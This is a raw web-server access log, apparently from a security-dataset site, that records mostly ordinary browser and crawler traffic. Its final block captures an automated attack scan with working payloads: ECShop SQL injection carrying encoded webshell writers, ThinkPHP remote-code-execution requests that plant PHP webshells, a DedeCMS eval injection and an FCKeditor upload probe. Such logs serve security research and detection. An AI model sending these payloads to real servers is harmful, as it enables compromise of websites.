40.77.167.125 - - [31/Jul/2019:01:59:15 -0700] "GET /self.logs/access.log.2018-02-28.gz HTTP/1.1" 304 175 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
36.152.36.2 - - [01/Aug/2019:00:39:05 -0700] "GET / HTTP/1.1" 200 12430 "http://www.allinsec.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
36.152.36.2 - - [01/Aug/2019:00:39:05 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
36.152.36.2 - - [01/Aug/2019:00:39:06 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
36.152.36.2 - - [01/Aug/2019:00:39:06 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
93.175.12.111 - - [01/Aug/2019:00:40:57 -0700] "GET / HTTP/1.1" 200 12430 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
93.175.12.111 - - [01/Aug/2019:00:40:57 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
93.175.12.111 - - [01/Aug/2019:00:40:57 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
93.175.12.111 - - [01/Aug/2019:00:40:58 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
93.175.12.111 - - [01/Aug/2019:00:40:59 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
218.201.98.56 - - [01/Aug/2019:00:42:15 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 140160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
218.201.98.56 - - [01/Aug/2019:00:44:28 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 615574 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
176.8.88.117 - - [01/Aug/2019:00:46:49 -0700] "GET / HTTP/1.1" 200 46561 "http://skorbota2008.ucoz.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
176.8.88.117 - - [01/Aug/2019:00:46:49 -0700] "GET / HTTP/1.1" 200 46561 "https://group.od.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01" 
176.8.88.117 - - [01/Aug/2019:00:46:49 -0700] "GET / HTTP/1.1" 200 46561 "http://skorbota2008.ucoz.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
176.8.88.117 - - [01/Aug/2019:00:46:49 -0700] "GET / HTTP/1.1" 200 46561 "https://group.od.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01" 
176.8.88.117 - - [01/Aug/2019:00:46:50 -0700] "GET / HTTP/1.1" 200 46561 "http://skorbota2008.ucoz.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
176.8.88.117 - - [01/Aug/2019:00:46:50 -0700] "GET / HTTP/1.1" 200 46561 "https://group.od.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01" 
113.171.224.176 - - [01/Aug/2019:00:50:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
182.76.162.186 - - [01/Aug/2019:01:00:55 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 
182.76.162.186 - - [01/Aug/2019:01:00:55 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 
182.76.162.186 - - [01/Aug/2019:01:00:56 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 
182.76.162.186 - - [01/Aug/2019:01:00:56 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 
182.76.162.186 - - [01/Aug/2019:01:00:56 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 
213.174.152.184 - - [01/Aug/2019:01:01:00 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.184 - - [01/Aug/2019:01:01:04 -0700] "GET / HTTP/1.1" 200 46561 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.187 - - [01/Aug/2019:01:05:45 -0700] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 301 497 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.186 - - [01/Aug/2019:01:05:48 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 301 513 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.185 - - [01/Aug/2019:01:06:14 -0700] "GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.185 - - [01/Aug/2019:01:06:22 -0700] "GET /data HTTP/1.1" 301 427 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.185 - - [01/Aug/2019:01:06:24 -0700] "GET /data HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.184 - - [01/Aug/2019:01:06:29 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.187 - - [01/Aug/2019:01:06:37 -0700] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 301 499 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.181 - - [01/Aug/2019:01:06:44 -0700] "GET /Datasets%20Description/Network/files.html HTTP/1.1" 301 497 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.184 - - [01/Aug/2019:01:07:27 -0700] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 301 493 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.184 - - [01/Aug/2019:01:07:35 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 301 507 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.181 - - [01/Aug/2019:01:08:00 -0700] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 301 493 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.187 - - [01/Aug/2019:01:08:06 -0700] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 301 499 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.186 - - [01/Aug/2019:01:08:13 -0700] "GET /Datasets%20Description/HTML_Bro_log_2 HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.184 - - [01/Aug/2019:01:08:37 -0700] "GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1" 301 501 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.186 - - [01/Aug/2019:01:08:44 -0700] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 301 493 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
213.174.152.187 - - [01/Aug/2019:01:08:50 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 301 493 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
111.91.80.25 - - [01/Aug/2019:01:12:34 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
111.91.80.25 - - [01/Aug/2019:01:12:35 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
111.91.80.25 - - [01/Aug/2019:01:12:35 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
111.91.80.25 - - [01/Aug/2019:01:12:35 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
111.91.80.25 - - [01/Aug/2019:01:12:36 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
196.201.24.2 - - [01/Aug/2019:01:20:30 -0700] "GET /self.logs/access.log.2015-01-17.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:31 -0700] "GET /self.logs/access.log.2015-01-18.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:31 -0700] "GET /self.logs/access.log.2015-01-19.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:31 -0700] "GET /self.logs/access.log.2015-01-20.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:32 -0700] "GET /self.logs/access.log.2015-01-21.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:32 -0700] "GET /self.logs/access.log.2015-01-22.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:32 -0700] "GET /self.logs/access.log.2015-01-23.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:33 -0700] "GET /self.logs/access.log.2015-01-24.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:33 -0700] "GET /self.logs/access.log.2015-01-25.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:33 -0700] "GET /self.logs/access.log.2015-01-26.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:33 -0700] "GET /self.logs/access.log.2015-01-27.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:34 -0700] "GET /self.logs/access.log.2015-01-28.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:34 -0700] "GET /self.logs/access.log.2015-01-29.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:34 -0700] "GET /self.logs/access.log.2015-01-30.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:35 -0700] "GET /self.logs/access.log.2015-01-31.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:35 -0700] "GET /self.logs/access.log.2015-02-01.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:35 -0700] "GET /self.logs/access.log.2015-02-02.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:36 -0700] "GET /self.logs/access.log.2015-02-03.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:36 -0700] "GET /self.logs/access.log.2015-02-04.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:36 -0700] "GET /self.logs/access.log.2015-02-05.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:37 -0700] "GET /self.logs/access.log.2015-02-06.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:37 -0700] "GET /self.logs/access.log.2015-02-07.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:37 -0700] "GET /self.logs/access.log.2015-02-08.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:38 -0700] "GET /self.logs/access.log.2015-02-09.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:38 -0700] "GET /self.logs/access.log.2015-02-10.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:38 -0700] "GET /self.logs/access.log.2015-02-11.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:39 -0700] "GET /self.logs/access.log.2015-02-12.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:39 -0700] "GET /self.logs/access.log.2015-02-13.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:39 -0700] "GET /self.logs/access.log.2015-02-14.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
196.201.24.2 - - [01/Aug/2019:01:20:40 -0700] "GET /self.logs/access.log.2015-02-15.gz HTTP/1.1" 404 294 "-" "python-requests/2.20.0" 
157.52.144.2 - - [01/Aug/2019:01:27:29 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 294 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:30 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 271 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:30 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 271 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:30 -0700] "GET /plus/moon.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:30 -0700] "POST /plus/90sec.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:30 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:31 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:31 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 271 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:31 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 271 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:31 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 271 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:32 -0700] "GET /user.php?act=login HTTP/1.1" 404 271 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:32 -0700] "POST /fdgq.php HTTP/1.1" 404 271 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:32 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=bzicu.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E HTTP/1.1" 200 46582 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=bzicu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:34 -0700] "POST /bzicu.php HTTP/1.1" 404 271 "http://www.secrepo.com/bzicu.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:34 -0700] "GET /user.php?act=login HTTP/1.1" 404 271 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:34 -0700] "POST /ysyqq.php HTTP/1.1" 404 271 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:35 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=noxyp.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E$ HTTP/1.1" 200 46582 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=noxyp.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
157.52.144.2 - - [01/Aug/2019:01:27:36 -0700] "POST /noxyp.php HTTP/1.1" 404 271 "http://www.secrepo.com/noxyp.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
